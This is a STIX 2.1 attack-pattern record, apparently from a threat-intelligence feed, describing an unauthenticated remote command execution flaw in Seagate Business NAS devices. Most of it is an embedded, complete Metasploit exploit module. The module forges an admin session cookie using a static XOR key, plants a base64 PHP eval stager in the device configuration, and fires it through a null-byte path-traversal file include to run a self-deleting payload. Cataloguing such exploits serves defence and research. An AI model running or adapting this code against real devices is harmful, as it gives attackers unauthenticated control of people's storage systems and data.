{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--88559ff8-5a2e-4437-a213-ecffb32f0a12",
    "created": "2024-08-14T17:01:53.778368Z",
    "modified": "2024-08-14T17:01:53.778372Z",
    "name": "Seagate Business NAS Unauthenticated Remote Command Execution",
    "description": " Some Seagate Business NAS devices are vulnerable to command execution via a local file include vulnerability hidden in the language parameter of the CodeIgniter session cookie. The vulnerability manifests in the way the language files are included in the code on the login page, and hence is open to attack from users without the need for authentication. The cookie can be easily decrypted using a known static encryption key and re-encrypted once the PHP object string has been modified.  This module has been tested on the STBN300 device. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/seagate_nas_php_exec_noauth.rb",
            "external_id": "seagate_nas_php_exec_noauth.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2014-8684"
        },
        {
            "source_name": "CVE",
            "external_id": "2014-8686"
        },
        {
            "source_name": "CVE",
            "external_id": "2014-8687"
        },
        {
            "source_name": "reference",
            "url": "http://www.seagate.com/au/en/support/external-hard-drives/network-storage/business-storage-2-bay-nas/"
        },
        {
            "source_name": "reference",
            "url": "https://beyondbinary.io/advisory/seagate-nas-rce/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'rexml/document'\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Seagate Business NAS Unauthenticated Remote Command Execution',\n      'Description'    => %q{\n        Some Seagate Business NAS devices are vulnerable to command execution via a local\n        file include vulnerability hidden in the language parameter of the CodeIgniter\n        session cookie. The vulnerability manifests in the way the language files are\n        included in the code on the login page, and hence is open to attack from users\n        without the need for authentication. The cookie can be easily decrypted using a\n        known static encryption key and re-encrypted once the PHP object string has been\n        modified.\n\n        This module has been tested on the STBN300 device.\n      },\n      'Author'         => [\n          'OJ Reeves <oj[at]beyondbinary.io>' # Discovery and Metasploit module\n        ],\n      'References'     => [\n          ['CVE', '2014-8684'],\n          ['CVE', '2014-8686'],\n          ['CVE', '2014-8687'],\n          ['EDB', '36202'],\n          ['URL', 'http://www.seagate.com/au/en/support/external-hard-drives/network-storage/business-storage-2-bay-nas/'],\n          ['URL', 'https://beyondbinary.io/advisory/seagate-nas-rce/']\n        ],\n      'DisclosureDate' => '2015-03-01',\n      'Privileged'     => true,\n      'Platform'       => 'php',\n      'Arch'           => ARCH_PHP,\n      'Payload'        => {'DisableNops' => true},\n      'Targets'        => [['Automatic', {}]],\n      'DefaultTarget'  => 0,\n      'License'        => MSF_LICENSE\n      ))\n\n    register_options([\n        OptString.new('TARGETURI', [true, 'Path to the application root', '/']),\n        OptString.new('ADMINACCOUNT', [true, 'Name of the NAS admin account', 'admin']),\n        OptString.new('COOKIEID', [true, 'ID of the CodeIgniter session cookie', 'ci_session']),\n        OptString.new('XORKEY', [true, 'XOR Key used for the CodeIgniter session', '0f0a000d02011f0248000d290d0b0b0e03010e07'])\n      ])\n  end\n\n  #\n  # Write a string value to a serialized PHP object without deserializing it first.\n  # If the value exists it will be updated.\n  #\n  def set_string(php_object, name, value)\n    prefix = \"s:#{name.length}:\\\"#{name}\\\";s:\"\n    if php_object.include?(prefix)\n      # the value already exists in the php blob, so update it.\n      return php_object.gsub(\"#{prefix}\\\\d+:\\\"[^\\\"]*\\\"\", \"#{prefix}#{value.length}:\\\"#{value}\\\"\")\n    end\n\n    # the value doesn't exist in the php blob, so create it.\n    count = php_object.split(':')[1].to_i + 1\n    php_object.gsub(/a:\\d+(.*)}$/, \"a:#{count}\\\\1#{prefix}#{value.length}:\\\"#{value}\\\";}\")\n  end\n\n  #\n  # Findez ze holez!\n  #\n  def check\n    begin\n      res = send_request_cgi(\n        'uri'      => normalize_uri(target_uri),\n        'method'   => 'GET',\n        'headers'  => {\n          'Accept' => 'text/html'\n        }\n      )\n\n      if res && res.code == 200\n        headers = res.to_s\n\n        # validate headers\n        if headers.include?('X-Powered-By: PHP/5.2.13') && headers.include?('Server: lighttpd/1.4.28')\n          # and make sure that the body contains the title we'd expect\n          if res.body.include?('Login to BlackArmor')\n            return Exploit::CheckCode::Appears\n          end\n        end\n      end\n    rescue Rex::ConnectionRefused, Rex::ConnectionTimeout, Rex::HostUnreachable\n      # something went wrong, assume safe.\n    end\n\n    Exploit::CheckCode::Safe\n  end\n\n  #\n  # Executez ze sploitz!\n  #\n  def exploit\n\n    # Step 1 - Establish a session with the target which will give us a PHP object we can\n    # work with.\n    begin\n      print_status(\"Establishing session with target ...\")\n      res = send_request_cgi({\n        'uri'    => normalize_uri(target_uri),\n        'method' => 'GET',\n        'headers'  => {\n          'Accept' => 'text/html'\n        }\n      })\n\n      if res && res.code == 200 && res.to_s =~ /#{datastore['COOKIEID']}=([^;]+);/\n        cookie_value = $1.strip\n      else\n        fail_with(Failure::Unreachable, \"#{peer} - Unexpected response from server.\")\n      end\n    rescue Rex::ConnectionRefused, Rex::ConnectionTimeout, Rex::HostUnreachable\n      fail_with(Failure::Unreachable, \"#{peer} - Unable to establish connection.\")\n    end\n\n    # Step 2 - Decrypt the cookie so that we have a PHP object we can work with directly\n    # then update it so that it's an admin session before re-encrypting\n    print_status(\"Upgrading session to administrator ...\")\n    php_object = decode_cookie(cookie_value)\n    vprint_status(\"PHP Object: #{php_object}\")\n\n    admin_php_object = set_string(php_object, 'is_admin', 'yes')\n    admin_php_object = set_string(admin_php_object, 'username', datastore['ADMINACCOUNT'])\n    vprint_status(\"Admin PHP object: #{admin_php_object}\")\n\n    admin_cookie_value = encode_cookie(admin_php_object)\n\n    # Step 3 - Extract the current host configuration so that we don't lose it.\n    host_config = nil\n\n    # This time value needs to be consistent across calls\n    config_time = ::Time.now.to_i\n\n    begin\n      print_status(\"Extracting existing host configuration ...\")\n      res = send_request_cgi(\n        'uri'      => normalize_uri(target_uri, 'index.php/mv_system/get_general_setup'),\n        'method'   => 'GET',\n        'headers'  => {\n          'Accept' => 'text/html'\n        },\n        'cookie'   => \"#{datastore['COOKIEID']}=#{admin_cookie_value}\",\n        'vars_get' => {\n          '_'      => config_time\n        }\n      )\n\n      if res && res.code == 200\n        res.body.split(\"\\r\\n\").each do |l|\n          if l.include?('general_setup')\n            host_config = l\n            break\n          end\n        end\n      else\n        fail_with(Failure::Unreachable, \"#{peer} - Unexpected response from server.\")\n      end\n    rescue Rex::ConnectionRefused, Rex::ConnectionTimeout, Rex::HostUnreachable\n      fail_with(Failure::Unreachable, \"#{peer} - Unable to establish connection.\")\n    end\n\n    print_good(\"Host configuration extracted.\")\n    vprint_status(\"Host configuration: #{host_config}\")\n\n    # Step 4 - replace the host device description with a custom payload that can\n    # be used for LFI. We have to keep the payload small because of size limitations\n    # and we can't put anything in with '$' in it. So we need to make a simple install\n    # payload which will write a required payload to disk that can be executes directly\n    # as the last part of the payload. This will also be self-deleting.\n    param_id = rand_text_alphanumeric(3)\n\n    # There are no files on the target file system that start with an underscore\n    # so to allow for a small file size that doesn't collide with an existing file\n    # we'll just prefix it with an underscore.\n    payload_file = \"_#{rand_text_alphanumeric(3)}.php\"\n\n    installer = \"file_put_contents('#{payload_file}', base64_decode($_POST['#{param_id}']));\"\n    stager = Rex::Text.encode_base64(installer)\n    stager = xml_encode(\"<?php eval(base64_decode('#{stager}')); ?>\")\n    vprint_status(\"Stager: #{stager}\")\n\n    # Butcher the XML directly rather than attempting to use REXML. The target XML\n    # parser is way to simple/flaky to deal with the proper stuff that REXML\n    # spits out.\n    desc_start = host_config.index('\" description=\"') + 15\n    desc_end = host_config.index('\"', desc_start)\n    xml_payload = host_config[0, desc_start] +\n                  stager + host_config[desc_end, host_config.length]\n    vprint_status(xml_payload)\n\n    # Step 5 - set the host description to the stager so that it is written to disk\n    print_status(\"Uploading stager ...\")\n    begin\n      res = send_request_cgi(\n        'uri'             => normalize_uri(target_uri, 'index.php/mv_system/set_general_setup'),\n        'method'          => 'POST',\n        'headers'         => {\n          'Accept'        => 'text/html'\n        },\n        'cookie'          => \"#{datastore['COOKIEID']}=#{admin_cookie_value}\",\n        'vars_get'        => {\n          '_'             => config_time\n        },\n        'vars_post'       => {\n          'general_setup' => xml_payload\n        }\n      )\n\n      unless res && res.code == 200\n        fail_with(Failure::Unreachable, \"#{peer} - Stager upload failed (invalid result).\")\n      end\n    rescue Rex::ConnectionRefused, Rex::ConnectionTimeout, Rex::HostUnreachable\n      fail_with(Failure::Unreachable, \"#{peer} - Stager upload failed (unable to establish connection).\")\n    end\n\n    print_good(\"Stager uploaded.\")\n\n    # Step 6 - Invoke the stage, passing in a self-deleting php script body.\n    print_status(\"Executing stager ...\")\n    payload_php_object = set_string(php_object, 'language', \"../../../etc/devicedesc\\x00\")\n    payload_cookie_value = encode_cookie(payload_php_object)\n    self_deleting_payload = \"<?php unlink(__FILE__);\\r\\n#{payload.encoded}; ?>\"\n    errored = false\n\n    begin\n      res = send_request_cgi(\n        'uri'      => normalize_uri(target_uri),\n        'method'   => 'POST',\n        'headers'  => {\n          'Accept' => 'text/html'\n        },\n        'cookie'    => \"#{datastore['COOKIEID']}=#{payload_cookie_value}\",\n        'vars_post' => {\n          param_id  => Rex::Text.encode_base64(self_deleting_payload)\n        }\n      )\n\n      if res && res.code == 200\n        print_good(\"Stager execution succeeded, payload ready for execution.\")\n      else\n        print_error(\"Stager execution failed (invalid result).\")\n        errored = true\n      end\n    rescue Rex::ConnectionRefused, Rex::ConnectionTimeout, Rex::HostUnreachable\n      print_error(\"Stager execution failed (unable to establish connection).\")\n      errored = true\n    end\n\n    # Step 7 - try to restore the previous configuration, allowing exceptions\n    # to bubble up given that we're at the end. This step is important because\n    # we don't want to leave a trail of junk on disk at the end.\n    print_status(\"Restoring host config ...\")\n    res = send_request_cgi(\n      'uri'             => normalize_uri(target_uri, 'index.php/mv_system/set_general_setup'),\n      'method'          => 'POST',\n      'headers'         => {\n        'Accept'        => 'text/html'\n      },\n      'cookie'          => \"#{datastore['COOKIEID']}=#{admin_cookie_value}\",\n      'vars_get'        => {\n        '_'             => config_time\n      },\n      'vars_post'       => {\n        'general_setup' => host_config\n      }\n    )\n\n    # Step 8 - invoke the installed payload, but only if all went to plan.\n    unless errored\n      print_status(\"Executing payload at #{normalize_uri(target_uri, payload_file)} ...\")\n      res = send_request_cgi(\n        'uri'      => normalize_uri(target_uri, payload_file),\n        'method'   => 'GET',\n        'headers'  => {\n          'Accept' => 'text/html'\n        },\n        'cookie'   => \"#{datastore['COOKIEID']}=#{payload_cookie_value}\"\n      )\n    end\n  end\n\n  #\n  # Take a CodeIgnitor cookie and pull out the PHP object using the XOR\n  # key that we've been given.\n  #\n  def decode_cookie(cookie_content)\n    cookie_value = Rex::Text.decode_base64(URI.decode(cookie_content))\n    pass = xor(cookie_value, datastore['XORKEY'])\n    result = ''\n\n    (0...pass.length).step(2).each do |i|\n      result << (pass[i].ord ^ pass[i + 1].ord).chr\n    end\n\n    result\n  end\n\n  #\n  # Take a serialised PHP object cookie value and encode it so that\n  # CodeIgniter thinks it's legit.\n  #\n  def encode_cookie(cookie_value)\n    rand = Rex::Text.sha1(rand_text_alphanumeric(40))\n\n    block  = ''\n\n    (0...cookie_value.length).each do |i|\n      block << rand[i % rand.length]\n      block << (rand[i % rand.length].ord ^ cookie_value[i].ord).chr\n    end\n\n    cookie_value = xor(block, datastore['XORKEY'])\n    cookie_value = CGI.escape(Rex::Text.encode_base64(cookie_value))\n    vprint_status(\"Cookie value: #{cookie_value}\")\n\n    cookie_value\n  end\n\n  #\n  # XOR a value against a key. The key is cycled.\n  #\n  def xor(string, key)\n    result = ''\n\n    string.bytes.zip(key.bytes.cycle).each do |s, k|\n      result << (s ^ k)\n    end\n\n    result\n  end\n\n  #\n  # Simple XML substitution because the target XML handler isn't really\n  # full blown or smart.\n  #\n  def xml_encode(str)\n    str.gsub(/</, '&lt;').gsub(/>/, '&gt;')\n  end\nend\n",
    "x_mitre_disclosure_date": "2015-03-01",
    "x_mitre_platforms": [
        "php'"
    ]
}